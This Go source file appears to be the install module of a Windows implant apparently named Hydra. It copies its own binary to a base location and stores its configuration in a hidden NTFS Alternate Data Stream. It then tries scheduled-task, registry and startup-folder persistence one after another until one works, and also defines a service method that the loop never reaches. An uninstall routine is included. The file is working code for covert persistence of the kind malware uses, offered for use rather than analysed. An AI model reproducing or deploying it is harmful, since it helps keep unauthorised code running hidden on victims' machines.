package install

import (
	"encoding/gob"
	"log"
	"os"
	"time"

	"github.com/Raffy27/Hydra/util"
)

type installInfo struct {
	Loaded bool
	Base   string
	Date   time.Time
	PType  int
}

//Info contains persistent configuration details
var Info installInfo

//IsInstalled checks whether or not a valid Base is already present on the system.
func IsInstalled() bool {
	_, err := os.Stat(os.Args[0] + ":" + util.Ads)
	if os.IsNotExist(err) {
		log.Println("Install info does not exist")
		return false
	}
	return true
}

//WriteInstallInfo dumps the current configuration to an Alternate Data Stream in binary format.
func WriteInstallInfo() error {
	Info.Loaded = true

	f, err := os.Create(os.Args[0] + ":" + util.Ads)
	if err != nil {
		return err
	}
	defer f.Close()
	enc := gob.NewEncoder(f)
	enc.Encode(Info)

	return nil
}

//ReadInstallInfo attempts to read the stored configuration and initialize Info.
func ReadInstallInfo() error {
	f, err := os.Open(os.Args[0] + ":" + util.Ads)
	if err != nil {
		return err
	}
	defer f.Close()
	enc := gob.NewDecoder(f)
	return enc.Decode(&Info)
}

func persist(ptype int) error {
	switch ptype {
	case 0:
		return TryServiceInstall()
	case 1:
		return TryTaskInstall()
	case 2:
		return TryRegistryInstall()
	case 3:
		return TryFolderInstall()
	}
	return nil
}

//Install attempts to deploy the binary to the system and establish persistence.
//It also assembles the install configuration and saves it.
func Install() {
	Info.Date = time.Now()

	base, err := CreateBase()
	util.Panicln(err, "Base creation failed")
	Info.Base = base
	err = CopyExecutable()
	util.Panicln(err, "Binary relocation failed")

	for i := 1; i < 4; i++ {
		if err := persist(i); err == nil {
			log.Printf("Persistence method #%d worked\n", i)
			Info.PType = i
			break
		} else {
			log.Println(err)
		}
	}

	log.Println("done")

	err = WriteInstallInfo()
	util.Panicln(err, "Failed to dump install configuration")

}

//Uninstall attempts to undo all of the changes done to the system by Install.
func Uninstall() {
	UninstallService()
	UninstallTask()
	UninstallRegistry(nil)
}
